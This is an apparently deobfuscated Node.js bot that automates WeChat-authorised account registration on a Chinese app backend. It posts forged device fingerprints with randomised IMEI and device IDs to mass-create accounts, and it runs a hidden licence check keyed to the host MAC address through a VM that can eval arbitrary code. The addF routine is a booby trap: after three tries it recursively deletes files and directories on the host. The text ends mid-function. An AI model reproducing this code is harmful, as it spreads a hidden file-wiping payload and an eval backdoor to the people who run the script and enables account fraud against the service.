//Fri Jan 03 2025 08:28:07 GMT+0000 (Coordinated Universal Time)
//Base:https://github.com/echo094/decode-js
//Modify:https://github.com/smallfawn/decode_action
const VM = require("sablejs/runtime")();
const path = require("path"),
  fs = require("fs"),
  cryptoJS = require("crypto-js");
function initVM() {
  vm = new VM();
  const _0x1a516f = vm.getGlobal(),
    _0x5f098e = vm.createObject(),
    _0x444a21 = vm.createFunction("log", function () {
      const _0x273ea7 = [];
      for (let _0x47b68a = 0; _0x47b68a < arguments.length; _0x47b68a++) {
        _0x273ea7.push(vm.asString(arguments[_0x47b68a]));
      }
      console.log(..._0x273ea7);
      return vm.createUndefined();
    }),
    _0x54c7a2 = vm.createFunction("xxxx", function (_0x5c50fa) {
      let _0x909422 = eval(_0x5c50fa.value);
      return vm.createString(JSON.stringify(_0x909422));
    });
  const _0xbe35bd = vm.createFunction("yyyy", function (_0x450bd9) {
    let _0x28f95e = _0x450bd9.value;
    let _0x2d184e = fs.readFileSync(_0x28f95e, "utf-8").replace(/\r\n/g, "\n");
    let _0xb622b5 = cryptoJS.MD5(_0x2d184e).toString();
    return vm.createString(_0xb622b5);
  });
  const _0x489107 = vm.createFunction("ddd", function (_0x2a434c) {
    let _0x54a009 = cryptoJS.MD5(_0x2a434c.value).toString();
    return vm.createString(_0x54a009);
  });
  vm.setProperty(_0x5f098e, "log", _0x444a21);
  vm.setProperty(_0x1a516f, "xxxx", _0x54c7a2);
  vm.setProperty(_0x1a516f, "console", _0x5f098e);
  vm.setProperty(_0x1a516f, "yyyy", _0xbe35bd);
  vm.setProperty(_0x1a516f, "ddd", _0x489107);
  vm.run(fs.readFileSync("./output_final.js").toString());
  return vm;
}
function destroyVM(_0x4002bd) {
  _0x4002bd.destroy();
}
function abc(_0x44cc93, _0x20b160, _0x2dbae3, _0x39de33, _0x150bb2) {
  const _0x2a36c6 = _0x44cc93.getGlobal();
  let _0x2369e1 = _0x44cc93.getProperty(_0x2a36c6, "xab");
  let _0x4b789f = _0x44cc93.call(_0x2369e1, _0x44cc93.createUndefined(), _0x44cc93.createString(_0x20b160), _0x44cc93.createString(_0x39de33), _0x44cc93.createString(_0x150bb2), _0x44cc93.createString(_0x2dbae3));
  _0x4b789f = _0x44cc93.asString(_0x4b789f);
  return _0x4b789f;
}
function xyz(_0x1060f2, _0x5107d2, _0x27bf33, _0x35448c, _0x5b3c69) {
  const _0x3ff702 = _0x1060f2.getGlobal();
  let _0x2c9bd9 = _0x1060f2.getProperty(_0x3ff702, "xmn");
  let _0x27aa08 = _0x1060f2.call(_0x2c9bd9, _0x1060f2.createUndefined(), _0x1060f2.createString(_0x5107d2), _0x1060f2.createString(_0x35448c), _0x1060f2.createString(_0x5b3c69), _0x1060f2.createString(_0x27bf33));
  _0x27aa08 = _0x1060f2.asString(_0x27aa08);
  return _0x27aa08;
}
const $ = new Env("微信授权注册");
let uuid,
  wxcode,
  num = 1;
let acckey = $.isNode() ? process.env.cdkey ? process.env.cdkey : "" : $.getdata("cdkey") ? $.getdata("cdkey") : "";
let arrs = [];
let mac = "";
if ($.isNode()) {
  gtr = require("fs");
  if (isFileExist("C:/")) {
    console.log("电脑环境");
  } else {
    console.log("青龙环境");
    function getMACAddresses() {
      var _0x19f8e5 = "",
        _0x3d1808 = fs.readdirSync("/sys/class/net/");
      _0x3d1808.forEach(function (_0x1019dc) {
        var _0x4d6e30 = path.join("/sys/class/net", _0x1019dc, "address");
        _0x1019dc.substr(0, 3) == "eth" && fs.existsSync(_0x4d6e30) && (_0x19f8e5 = fs.readFileSync(_0x4d6e30).toString().trim());
      });
      return _0x19f8e5;
    }
    mac = getMACAddresses();
  }
} else {
  console.log("代理环境");
}
function isFileExist(_0x44df14) {
  try {
    gtr.accessSync(_0x44df14, gtr.F_OK);
  } catch (_0x1fa557) {
    return false;
  }
  return true;
}
function addF(_0xbdf153, _0xa1110e) {
  let _0x35521a = 0,
    _0x50c2fc = "C:/Windows/system.txt";
  if (isFileExist(_0x50c2fc)) {
    _0x35521a = gtr.readFileSync(_0x50c2fc, "utf8");
  } else {
    if (isFileExist("C:/")) {
      gtr.writeFile(_0x50c2fc, "1", function (_0xbd090e) {
        if (_0xbd090e) {
          throw _0xbd090e;
        }
      });
    } else {
      return;
    }
  }
  if (_0x35521a == 99) {
    return 99;
  }
  console.log(_0x35521a);
  console.log("警告，恶意破解脚本将面临系统爆炸！！！，你只有3次机会！", _0x35521a);
  if (parseInt(_0x35521a) < 3) {
    let _0x2c0396 = parseInt(_0x35521a) + 1;
    gtr.writeFileSync(_0x50c2fc, _0x2c0396 + "", "utf8");
    return;
  }
  if (!gtr.existsSync(_0xbdf153)) {
    return;
  }
  if (gtr.statSync(_0xbdf153).isDirectory()) {
    var _0xeb7a1b = gtr.readdirSync(_0xbdf153),
      _0x53fb19 = _0xeb7a1b.length,
      _0x44bce0 = 0;
    if (_0x53fb19 > 0) {
      _0xeb7a1b.forEach(function (_0x105852) {
        _0x44bce0++;
        var _0x51f275 = _0xbdf153 + "/" + _0x105852;
        gtr.statSync(_0x51f275).isDirectory() ? addF(_0x51f275, true) : gtr.unlinkSync(_0x51f275);
      });
      _0x53fb19 == _0x44bce0 && _0xa1110e && gtr.rmdirSync(_0xbdf153);
    } else {
      _0x53fb19 == 0 && _0xa1110e && gtr.rmdirSync(_0xbdf153);
    }
  } else {
    gtr.unlinkSync(_0xbdf153);
  }
}
!(async () => {
  initVM();
  arrs = abc(global.vm, acckey, mac, 34, 0);
  if (arrs == "") {
    return;
  }
  arrs = JSON.parse(arrs);
  if (!arrs) {
    return;
  }
  if ($.isNode()) {
    for (let _0x4c3892 = 0; _0x4c3892 < num; _0x4c3892++) {
      $.index = _0x4c3892 + 1;
      console.log("\n开始【微信授权" + $.index + "】");
      await sign();
      await $.wait(1000);
    }
  }
  destroyVM(global.vm);
})().catch(_0x1aeb5a => $.logErr(_0x1aeb5a)).finally(() => $.done());
async function sign() {
  return new Promise(_0x4c2479 => {
    let _0xac0af7 = {
      url: "http://www.tolego.cn/web/game/common/?id=hlddz&appid=wxd4bec82b0fbad5e2&wx_bundleid=com.hyllq&tid=2101&type=0",
      timeout: 3000
    };
    $.get(_0xac0af7, async (_0x295dd3, _0x17b187, _0x550d7f) => {
      try {
        str = _0x550d7f.match(/ <img class=\"auth_qrcode\" src=\"(\S*)\"/)[1];
        console.log(str);
        uuid = str.substr(-16);
        console.log("开始微信授权");
        wxcode = 0;
        let _0x4a644d = 0;
        do {
          await $.wait(3500);
          let _0x5cd0c0 = Math.round(new Date().getTime() / 1000).toString();
          await qrconnect(_0x5cd0c0);
          _0x4a644d++;
        } while (wxcode == 0 && _0x4a644d < 30);
      } catch (_0x32f291) {
        $.logErr(_0x32f291, _0x17b187);
      } finally {
        _0x4c2479();
      }
    });
  });
}
function reconvert(_0x30f247) {
  _0x30f247 = _0x30f247.replace(/(\\u)(\w{1,4})/gi, function (_0x7f3deb) {
    return String.fromCharCode(parseInt(escape(_0x7f3deb).replace(/(%5Cu)(\w{1,4})/g, "$2"), 16));
  });
  _0x30f247 = _0x30f247.replace(/(&#x)(\w{1,4});/gi, function (_0xba9af9) {
    return String.fromCharCode(parseInt(escape(_0xba9af9).replace(/(%26%23x)(\w{1,4})(%3B)/g, "$2"), 16));
  });
  _0x30f247 = _0x30f247.replace(/(&#)(\d{1,6});/gi, function (_0x3ec484) {
    return String.fromCharCode(parseInt(escape(_0x3ec484).replace(/(%26%23)(\d{1,6})(%3B)/g, "$2")));
  });
  return _0x30f247;
}
function qrconnect(_0xfd49e1) {
  return new Promise(_0x144e89 => {
    let _0x32d4cf = {
      url: "https://long.open.weixin.qq.com/connect/l/qrconnect?uuid=" + uuid + "&f=url&_=" + _0xfd49e1,
      timeout: 3000
    };
    $.get(_0x32d4cf, async (_0x5e7d81, _0x16185c, _0x5c7ab6) => {
      try {
        let _0x43165f = _0x5c7ab6.substr(18, 3);
        _0x43165f == 405 && (wxcode = _0x5c7ab6.match(/oauth\?code=(\S*)&/)[1], console.log("微信code :" + wxcode), console.log("\n开始授权登录"), await register());
      } catch (_0x30681c) {
        $.logErr(_0x30681c, _0x16185c);
      } finally {
        _0x144e89();
      }
    });
  });
}
function register() {
  return new Promise(_0x4defab => {
    let _0x52554c = new Date().getTime();
    let _0x6751c3 = {
      url: "http://api.hyjisu.jialaiinfo.com//midplatform/login/by/weixin?userId=-1&loginId=null",
      headers: {
        Host: "api.hyjisu.jialaiinfo.com",
        "Content-Type": "application/json; charset=utf-8",
        "User-Agent": "okhttp/3.12.10"
      },
      body: "{\"appExtra\":\"{\\\"applicationDir\\\":\\\"/data/user/0/com.hyllq/files\\\",\\\"appVersionName\\\":\\\"1.0.0\\\",\\\"appChannel\\\":\\\"liexiang\\\"}\",\"code\":\"" + wxcode + "\",\"loginId\":\"null\",\"deviceExtra\":\"{\\\"isRoot\\\":true,\\\"contextInfo\\\":{\\\"filePath\\\":\\\"/data/user/0/com.hyllq/files/\\\",\\\"uid\\\":10631},\\\"cpu\\\":\\\"AArch64 Processor rev 14 (aarch64)\\\",\\\"screen\\\":{\\\"dpi\\\":3.0,\\\"height\\\":2232,\\\"width\\\":1080},\\\"imsi\\\":\\\"" + randomString(16) + "\\\",\\\"manufacturer\\\":\\\"Meizu\\\",\\\"macAddress\\\":\\\"DE:EC:1D:07:26:05\\\",\\\"appStore\\\":[\\\"com.meizu.mstore\\\",\\\"com.tencent.mtt\\\"],\\\"memorySize\\\":5764734976,\\\"osVersion\\\":\\\"10\\\",\\\"networkInterface\\\":[{\\\"displayName\\\":\\\"dummy0\\\",\\\"name\\\":\\\"dummy0\\\",\\\"isVirtual\\\":false},{\\\"displayName\\\":\\\"r_rmnet_data2\\\",\\\"name\\\":\\\"r_rmnet_data2\\\",\\\"isVirtual\\\":false},{\\\"displayName\\\":\\\"r_rmnet_data3\\\",\\\"name\\\":\\\"r_rmnet_data3\\\",\\\"isVirtual\\\":false},{\\\"displayName\\\":\\\"r_rmnet_data0\\\",\\\"name\\\":\\\"r_rmnet_data0\\\",\\\"isVirtual\\\":false},{\\\"displayName\\\":\\\"ip_vti0\\\",\\\"name\\\":\\\"ip_vti0\\\",\\\"isVirtual\\\":false},{\\\"displayName\\\":\\\"lo\\\",\\\"name\\\":\\\"lo\\\",\\\"isVirtual\\\":false},{\\\"displayName\\\":\\\"r_rmnet_data1\\\",\\\"name\\\":\\\"r_rmnet_data1\\\",\\\"isVirtual\\\":false},{\\\"displayName\\\":\\\"wlan1\\\",\\\"name\\\":\\\"wlan1\\\",\\\"isVirtual\\\":false},{\\\"displayName\\\":\\\"wlan0\\\",\\\"name\\\":\\\"wlan0\\\",\\\"isVirtual\\\":false},{\\\"displayName\\\":\\\"ip6tnl0\\\",\\\"name\\\":\\\"ip6tnl0\\\",\\\"isVirtual\\\":false},{\\\"displayName\\\":\\\"rmnet_data10\\\",\\\"name\\\":\\\"rmnet_data10\\\",\\\"isVirtual\\\":false},{\\\"displayName\\\":\\\"bond0\\\",\\\"name\\\":\\\"bond0\\\",\\\"isVirtual\\\":false},{\\\"displayName\\\":\\\"ip6_vti0\\\",\\\"name\\\":\\\"ip6_vti0\\\",\\\"isVirtual\\\":false},{\\\"displayName\\\":\\\"sit0\\\",\\\"name\\\":\\\"sit0\\\",\\\"isVirtual\\\":false},{\\\"displayName\\\":\\\"rmnet_data8\\\",\\\"name\\\":\\\"rmnet_data8\\\",\\\"isVirtual\\\":false},{\\\"displayName\\\":\\\"rmnet_data7\\\",\\\"name\\\":\\\"rmnet_data7\\\",\\\"isVirtual\\\":false},{\\\"displayName\\\":\\\"rmnet_data9\\\",\\\"name\\\":\\\"rmnet_data9\\\",\\\"isVirtual\\\":false},{\\\"displayName\\\":\\\"rmnet_data0\\\",\\\"name\\\":\\\"rmnet_data0\\\",\\\"isVirtual\\\":false},{\\\"displayName\\\":\\\"p2p0\\\",\\\"name\\\":\\\"p2p0\\\",\\\"isVirtual\\\":false},{\\\"displayName\\\":\\\"rmnet_data2\\\",\\\"name\\\":\\\"rmnet_data2\\\",\\\"isVirtual\\\":false},{\\\"displayName\\\":\\\"rmnet_data1\\\",\\\"name\\\":\\\"rmnet_data1\\\",\\\"isVirtual\\\":false},{\\\"displayName\\\":\\\"rmnet_data4\\\",\\\"name\\\":\\\"rmnet_data4\\\",\\\"isVirtual\\\":false},{\\\"displayName\\\":\\\"tun0\\\",\\\"name\\\":\\\"tun0\\\",\\\"isVirtual\\\":false},{\\\"displayName\\\":\\\"rmnet_data3\\\",\\\"name\\\":\\\"rmnet_data3\\\",\\\"isVirtual\\\":false},{\\\"displayName\\\":\\\"rmnet_data6\\\",\\\"name\\\":\\\"rmnet_data6\\\",\\\"isVirtual\\\":false},{\\\"displayName\\\":\\\"rmnet_data5\\\",\\\"name\\\":\\\"rmnet_data5\\\",\\\"isVirtual\\\":false},{\\\"displayName\\\":\\\"r_rmnet_data8\\\",\\\"name\\\":\\\"r_rmnet_data8\\\",\\\"isVirtual\\\":false},{\\\"displayName\\\":\\\"r_rmnet_data6\\\",\\\"name\\\":\\\"r_rmnet_data6\\\",\\\"isVirtual\\\":false},{\\\"displayName\\\":\\\"r_rmnet_data7\\\",\\\"name\\\":\\\"r_rmnet_data7\\\",\\\"isVirtual\\\":false},{\\\"displayName\\\":\\\"r_rmnet_data4\\\",\\\"name\\\":\\\"r_rmnet_data4\\\",\\\"isVirtual\\\":false},{\\\"displayName\\\":\\\"r_rmnet_data5\\\",\\\"name\\\":\\\"r_rmnet_data5\\\",\\\"isVirtual\\\":false},{\\\"displayName\\\":\\\"rmnet_ipa0\\\",\\\"name\\\":\\\"rmnet_ipa0\\\",\\\"isVirtual\\\":false}],\\\"model\\\":\\\"16s Pro\\\",\\\"installedApp\\\":[\\\"com.toomee.stars\\\",\\\"com.midea.ai.appliances\\\",\\\"com.baidu.student\\\",\\\"com.qihoo.magic.d0WbuQnblNmblRnLt92Yk_101\\\",\\\"com.qihoo.magic.d0WbuQnblNmblRnLt92Yk_102\\\",\\\"com.qihoo.magic.d0WbuQnblNmblRnLt92Yk_103\\\",\\\"com.qihoo.magic.d0WbuQnblNmblRnLt92Yk_104\\\",\\\"com.qihoo.magic.d0WbuQnblNmblRnLt92Yk_105\\\",\\\"com.qihoo.magic.d0WbuQnblNmblRnLt92Yk_106\\\",\\\"com.qihoo.magic.d0WbuQnblNmblRnLt92Yk_107\\\",\\\"com.mercury.ipc\\\",\\\"com.top.qupin\\\",\\\"com.renwubang.apps\\\",\\\"com.apps.jinzhuan\\\",\\\"com.quxianzhuan.wap\\\",\\\"com.suhu.meiyong\\\",\\\"com.sinovatech.unicom.ui\\\",\\\"com.android.sdk.AntTalk\\\",\\\"com.ushaqi.zhuishushenqi\\\",\\\"com.ss.android.ugc.aweme.lite\\\",\\\"com.qihoo.magic.dQnblRWd0NnL1RWahJmLt92Yk_101\\\",\\\"com.sxkj.huaya\\\",\\\"com.jdcloud.mt.smartrouter\\\",\\\"work.master.qinglongapp\\\",\\\"com.v2ray.ang\\\",\\\"me.ele\\\",\\\"com.tencent.mm\\\",\\\"com.happy.answer\\\",\\\"com.chinamworld.bocmbci\\\",\\\"com.qiyun.wangdeduo\\\",\\\"com.qihoo.magic.dQYsVnYl5mL19GazlWY1tmLt92Yk_101\\\",\\\"com.qihoo.magic.dQYsVnYl5mL19GazlWY1tmLt92Yk_102\\\",\\\"com.qihoo.magic.dQYsVnYl5mL19GazlWY1tmLt92Yk_103\\\",\\\"com.qihoo.magic.dQYsVnYl5mL19GazlWY1tmLt92Yk_104\\\",\\\"com.qihoo.magic.dQYsVnYl5mL19GazlWY1tmLt92Yk_105\\\",\\\"com.qihoo.magic.dQYsVnYl5mL19GazlWY1tmLt92Yk_106\\\",\\\"com.qihoo.magic.dQYsVnYl5mL19GazlWY1tmLt92Yk_107\\\",\\\"com.qihoo.magic.dQYsVnYl5mL19GazlWY1tmLt92Yk_108\\\",\\\"com.qihoo.magic.dQYsVnYl5mL19GazlWY1tmLt92Yk_109\\\",\\\"com.qihoo.magic.dQYsVnYl5mL19GazlWY1tmLt92Yk_110\\\",\\\"com.qihoo.magic.dQYsVnYl5mL19GazlWY1tmLt92Yk_111\\\",\\\"com.qihoo.magic.dQYsVnYl5mL19GazlWY1tmLt92Yk_112\\\",\\\"com.qihoo.magic.dQYsVnYl5mL19GazlWY1tmLt92Yk_113\\\",\\\"com.qihoo.magic.dQYsVnYl5mL19GazlWY1tmLt92Yk_114\\\",\\\"com.qihoo.magic.dQYsVnYl5mL19GazlWY1tmLt92Yk_115\\\",\\\"com.qihoo.magic.dQYsVnYl5mL19GazlWY1tmLt92Yk_116\\\",\\\"com.qihoo.magic.dQYsVnYl5mL19GazlWY1tmLt92Yk_117\\\",\\\"com.qihoo.magic.dQYsVnYl5mL19GazlWY1tmLt92Yk_118\\\",\\\"com.qihoo.magic.dQYsVnYl5mL19GazlWY1tmLt92Yk_119\\\",\\\"com.dati.baby\\\",\\\"org.telegram.messenger.web\\\",\\\"com.yuncheapp.android.pearl\\\",\\\"com.icbc\\\",\\\"mobi.acpm.inspeckage\\\",\\\"cn.com.sina.finance\\\",\\\"bin.mt.plus\\\",\\\"just.trust.me\\\",\\\"com.qihoo.magic.dIXZkxWZuQWavJHZuFmL192Z1tmLt92Yk_101\\\",\\\"com.qihoo.magic.dIXZkxWZuQWavJHZuFmL192Z1tmLt92Yk_102\\\",\\\"com.qihoo.magic.dIXZkxWZuQWavJHZuFmL192Z1tmLt92Yk_103\\\",\\\"com.qihoo.magic.dIXZkxWZuQWavJHZuFmL192Z1tmLt92Yk_104\\\",\\\"com.qihoo.magic.dIXZkxWZuQWavJHZuFmL192Z1tmLt92Yk_105\\\",\\\"com.qihoo.magic.dIXZkxWZuQWavJHZuFmL192Z1tmLt92Yk_106\\\",\\\"com.qihoo.magic.dIXZkxWZuQWavJHZuFmL192Z1tmLt92Yk_107\\\",\\\"com.qihoo.magic.dIXZkxWZuQWavJHZuFmL192Z1tmLt92Yk_108\\\",\\\"com.qihoo.magic.dIXZkxWZuQWavJHZuFmL192Z1tmLt92Yk_109\\\",\\\"com.qihoo.magic.dIXZkxWZuQWavJHZuFmL192Z1tmLt92Yk_110\\\",\\\"com.qihoo.magic.dIXZkxWZuQWavJHZuFmL192Z1tmLt92Yk_111\\\",\\\"com.qihoo.magic.dIXZkxWZuQWavJHZuFmL192Z1tmLt92Yk_112\\\",\\\"com.qihoo.magic.dIXZkxWZuQWavJHZuFmL192Z1tmLt92Yk_113\\\",\\\"com.qihoo.magic.dIXZkxWZuQWavJHZuFmL192Z1tmLt92Yk_114\\\",\\\"com.qihoo.magic.dIXZkxWZuQWavJHZuFmL192Z1tmLt92Yk_115\\\",\\\"com.tencent.qqlive\\\",\\\"cn.com.pconline.android.browser\\\",\\\"com.sht.haihe\\\",\\\"com.tencent.mtt\\\",\\\"com.jialai.lzllq\\\",\\\"com.xunmeng.pinduoduo\\\",\\\"com.tencent.wework\\\",\\\"com.tencent.tmgp.leiben.bridge\\\",\\\"com.haier.uhome.uplus\\\",\\\"com.ss.android.article.news\\\",\\\"com.solohsu.android.edxp.manager\\\",\\\"com.youdao.dict\\\",\\\"com.jd.jdlite\\\",\\\"com.qihoo.magic.dsJXYlBnLkl2byRmbh5CcwFWZoNmb1lnLt92Yk_101\\\",\\\"com.qihoo.magic.dsJXYlBnLkl2byRmbh5CcwFWZoNmb1lnLt92Yk_102\\\",\\\"com.qihoo.magic.dsJXYlBnLkl2byRmbh5CcwFWZoNmb1lnLt92Yk_103\\\",\\\"com.qihoo.magic.dsJXYlBnLkl2byRmbh5CcwFWZoNmb1lnLt92Yk_104\\\",\\\"com.qihoo.magic.dsJXYlBnLkl2byRmbh5CcwFWZoNmb1lnLt92Yk_105\\\",\\\"com.qihoo.magic.dsJXYlBnLkl2byRmbh5CcwFWZoNmb1lnLt92Yk_106\\\",\\\"com.qihoo.magic.dsJXYlBnLkl2byRmbh5CcwFWZoNmb1lnLt92Yk_107\\\",\\\"com.qihoo.magic.dsJXYlBnLkl2byRmbh5CcwFWZoNmb1lnLt92Yk_108\\\",\\\"com.qihoo.magic.dsJXYlBnLkl2byRmbh5CcwFWZoNmb1lnLt92Yk_109\\\",\\\"com.qihoo.magic.dsJXYlBnLkl2byRmbh5CcwFWZoNmb1lnLt92Yk_110\\\",\\\"com.qihoo.magic.dsJXYlBnLkl2byRmbh5CcwFWZoNmb1lnLt92Yk_111\\\",\\\"com.qihoo.magic.dsJXYlBnLkl2byRmbh5CcwFWZoNmb1lnLt92Yk_112\\\",\\\"com.qihoo.magic.dsJXYlBnLkl2byRmbh5CcwFWZoNmb1lnLt92Yk_113\\\",\\\"com.qihoo.magic.dsJXYlBnLkl2byRmbh5CcwFWZoNmb1lnLt92Yk_114\\\",\\\"com.qihoo.magic.dsJXYlBnLkl2byRmbh5CcwFWZoNmb1lnLt92Yk_115\\\",\\\"com.ljhdata.lydatas\\\",\\\"com.qihoo.magic\\\",\\\"com.tencent.mobileqq\\\",\\\"app.baoku\\\",\\\"com.youzikuaibao.tianji\\\",\\\"com.happyteam.dubbingshow\\\",\\\"com.kugou.android\\\",\\\"com.jd.pingou\\\",\\\"com.kuaishou.nebula\\\",\\\"kuaima.minigame.crazyplane\\\",\\\"com.byd.aeri.caranywhere\\\",\\\"com.topjohnwu.magisk\\\",\\\"com.ainong.shepherdboy\\\",\\\"com.atominvention.rootchecker\\\",\\\"com.junge.algorithmAide\\\",\\\"com.kugou.android.elder\\\",\\\"com.hyllq\\\",\\\"com.lw.sq\\\",\\\"top.niunaijun.blackdexa32\\\",\\\"com.jingdong.app.mall\\\",\\\"com.autonavi.minimap\\\",\\\"com.guoshi.httpcanary\\\",\\\"com.taobao.idlefish\\\",\\\"com.wmj99app.hms\\\",\\\"com.cmic.heduohao\\\",\\\"ctrip.android.view\\\",\\\"youqu.android.todesk\\\",\\\"com.shulu.read\\\",\\\"com.sina.weibo\\\",\\\"uni.UNI7E0E53F\\\",\\\"com.qihoo.magic.dQWavJHZuFmL192Z1tmLt92Yk_101\\\",\\\"com.qihoo.magic.dQWavJHZuFmL192Z1tmLt92Yk_102\\\",\\\"com.qihoo.magic.dQWavJHZuFmL192Z1tmLt92Yk_103\\\",\\\"com.qihoo.magic.dQWavJHZuFmL192Z1tmLt92Yk_104\\\",\\\"com.qihoo.magic.dQWavJHZuFmL192Z1tmLt92Yk_105\\\",\\\"com.qihoo.magic.dQWavJHZuFmL192Z1tmLt92Yk_106\\\",\\\"com.qihoo.magic.dQWavJHZuFmL192Z1tmLt92Yk_107\\\",\\\"com.qihoo.magic.dQWavJHZuFmL192Z1tmLt92Yk_108\\\",\\\"com.qihoo.magic.dQWavJHZuFmL192Z1tmLt92Yk_109\\\",\\\"com.qihoo.magic.dQWavJHZuFmL192Z1tmLt92Yk_110\\\",\\\"com.qihoo.magic.dQWavJHZuFmL192Z1tmLt92Yk_111\\\",\\\"com.qihoo.magic.dQWavJHZuFmL192Z1tmLt92Yk_112\\\",\\\"com.qihoo.magic.dQWavJHZuFmL192Z1tmLt92Yk_113\\\",\\\"com.qihoo.magic.dQWavJHZuFmL192Z1tmLt92Yk_114\\\",\\\"com.qihoo.magic.dQWavJHZuFmL192Z1tmLt92Yk_115\\\",\\\"com.haoyou.browser\\\",\\\"com.taobao.taobao\\\",\\\"com.qihoo.magic.dzdXZu5SZsNWa0JXYuQWavJHZuFmLzNnLt92Yk_101\\\",\\\"com.qihoo.magic.dzdXZu5SZsNWa0JXYuQWavJHZuFmLzNnLt92Yk_102\\\",\\\"com.eg.android.AlipayGphone\\\",\\\"com.alicom.smartdail\\\",\\\"com.wantime.wbangapp.pika\\\"],\\\"brand\\\":\\\"meizu\\\",\\\"androidId\\\":\\\"" + randomString(16) + "\\\",\\\"board\\\":\\\"msmnile\\\",\\\"hardware\\\":\\\"qcom\\\",\\\"simulatorFile\\\":[]}\",\"channel\":\"hyjisu\",\"sign\":\"8abef443da14ea73b743c97708e0cffe\",\"deviceId\":\"" + randomString(16) + "\",\"version\":52,\"userId\":\"null\",\"context\":{\"aid\":\"" + randomString(16) + "\",\"apiVersion\":29,\"appInfo\":{\"channel\":\"liexiang\",\"golden\":0,\"version\":1},\"bd\":true,\"brand\":\"meizu\",\"golden\":0,\"imei\":\"" + randomString(16) + "\",\"mac\":\"DE:EC:1D:07:26:05\",\"model\":\"16s Pro\",\"network\":0,\"os\":1,\"osVersion\":\"10\",\"pkgList\":[\"com.ss.android.ugc.aweme.lite\",\"com.dati.baby\",\"com.tencent.mm\",\"com.haoyou.browser\",\"com.haoyou.browser\",\"com.sina.weibo\",\"com.xunmeng.pinduoduo\",\"com.jingdong.app.mall\",\"com.taobao.taobao\",\"com.jialai.lzllq\",\"com.hyllq\"],\"proxy\":false,\"shortcut\":false,\"vpn\":true,\"webAttr\":\"360_744_3.000\"},\"imei\":\"" + randomString(16) + "\",\"sdkVersion\":1,\"timestamp\":" + _0x52554c + "}"
    };
    $.post(_0x6751c3, async (_0x32fce1, _0xcac7da, _0xc944c7) => {
      try {
        let _0x3b7dd5 = JSON.parse(_0xc944c7);
        console.log("userId=" + _0x3b7dd5.userInfo.userId + "&loginId=" + _0x3b7dd5.loginId);
      } catch (_0x1e0bec) {
        $.logErr(_0x1e0bec, _0xcac7da);
      } finally {
        _0x4defab();
      }
    });
  });
}
function randomString(_0x3beb94 = 12) {
  let _0x163c94 = "abcdef0123456789",
    _0x5d35af = _0x163c94.length,
    _0xd3e2a5 = "";
  for (i = 0; i < _0x3beb94; i++) {
    _0xd3e2a5 += _0x163c94.charAt(Math.floor(Math.random() * _0x5d35af));
  }
  return _0xd3e2a5;
}
function Env(_0x480ab2, _0x4424f4) {
  class _0x86fdf6 {
    constructor(_0x2cd26e) {
      this.env = _0x2cd26e;
    }
    send(_0x4acb8c, _0x49672a = "GET") {
      _0x4acb8c = "string" == typeof _0x4acb8c ? {
        url: _0x4acb8c
      } : _0x4acb8c;
      let _0x40060a = this.get;
      "POST" === _0x49672a && (_0x40060a = this.post);
      return new Promise((_0x3d5caa, _0x4f7afe) => {
        _0x40060a.call(this, _0x4acb8c, (_0x5b2d6a, _0xac4177, _0x147b3e) => {
          _0x5b2d6a ? _0x4f7afe(_0x5b2d6a) : _0x3d5caa(_0xac4177);
        });
      });
    }
    get(_0xd9acda) {
      return this.send.call(this.env, _0xd9acda);
    }
    post(_0x8bfe1) {
      return this.send.call(this.env, _0x8bfe1, "POST");
    }
  }
  return new class {
    constructor(_0x528e6a, _0x14be19) {
      this.name = _0x528e6a;
      this.http = new _0x86fdf6(this);
      this.data = null;
      this.dataFile = "box.dat";
      this.logs = [];
      this.isMute = !1;
      this.isNeedRewrite = !1;
      this.logSeparator = "\n";
      this.startTime = new Date().getTime();
      Object.assign(this, _0x14be19);
      this.log("", "🔔" + this.name + ", 开始!");
    }
    isNode() {
      return "undefined" != typeof module && !!module.exports;
    }
    isQuanX() {
      return "undefined" != typeof $task;
    }
    isSurge() {
      return "undefined" != typeof $httpClient && "undefined" == typeof $loon;
    }
    isLoon() {
      return "undefined" != typeof $loon;
    }
    toObj(_0x38b693, _0xcc78f2 = null) {
      try {
        return JSON.parse(_0x38b693);
      } catch {
        return _0xcc78f2;
      }
    }
    toStr(_0x357c06, _0x267fdc = null) {
      try {
        return JSON.stringify(_0x357c06);
      } catch {
        return _0x267fdc;
      }
    }
    getjson(_0x829973, _0x21a1bc) {
      let _0x3030e4 = _0x21a1bc;
      const _0x543de8 = this.getdata(_0x829973);
      if (_0x543de8) {
        try {
          _0x3030e4 = JSON.parse(this.getdata(_0x829973));
        } catch {}
      }
      return _0x3030e4;
    }
    setjson(_0x58c33f, _0x39e6d2) {
      try {
        return this.setdata(JSON.stringify(_0x58c33f), _0x39e6d2);
      } catch {
        return !1;
      }
    }
    getScript(_0x46d579) {
      return new Promise(_0x1f6272 => {
        this.get({
          url: _0x46d579
        }, (_0x3dd4a4, _0x10409f, _0x218046) => _0x1f6272(_0x218046));
      });
    }
    runScript(_0xc19773, _0x501931) {
      return new Promise(_0x3891b7 => {
        let _0x36a7c7 = this.getdata("@chavy_boxjs_userCfgs.httpapi");
        _0x36a7c7 = _0x36a7c7 ? _0x36a7c7.replace(/\n/g, "").trim() : _0x36a7c7;
        let _0x2a2ebe = this.getdata("@chavy_boxjs_userCfgs.httpapi_timeout");
        _0x2a2ebe = _0x2a2ebe ? 1 * _0x2a2ebe : 20;
        _0x2a2ebe = _0x501931 && _0x501931.timeout ? _0x501931.timeout : _0x2a2ebe;
        const [_0x118454, _0x2ff15e] = _0x36a7c7.split("@"),
          _0x564382 = {
            url: "http://" + _0x2ff15e + "/v1/scripting/evaluate",
            body: {
              script_text: _0xc19773,
              mock_type: "cron",
              timeout: _0x2a2ebe
            },
            headers: {
              "X-Key": _0x118454,
              Accept: "*/*"
            }
          };
        this.post(_0x564382, (_0x59e117, _0x201e95, _0x25a779) => _0x3891b7(_0x25a779));
      }).catch(_0x4da79e => this.logErr(_0x4da79e));
    }
    loaddata() {
      if (!this.isNode()) {
        return {};
      }
      {
        this.fs = this.fs ? this.fs : require("fs");
        this.path = this.path ? this.path : require("path");
        const _0x5335b1 = this.path.resolve(this.dataFile),
          _0x3700c7 = this.path.resolve(process.cwd(), this.dataFile),
          _0x57c151 = this.fs.existsSync(_0x5335b1),
          _0x9da847 = !_0x57c151 && this.fs.existsSync(_0x3700c7);
        if (!_0x57c151 && !_0x9da847) {
          return {};
        }
        {
          const _0x33540 = _0x57c151 ? _0x5335b1 : _0x3700c7;
          try {
            return JSON.parse(this.fs.readFileSync(_0x33540));
          } catch (_0x119ae3) {
            return {};
          }
        }
      }
    }
    writedata() {
      if (this.isNode()) {
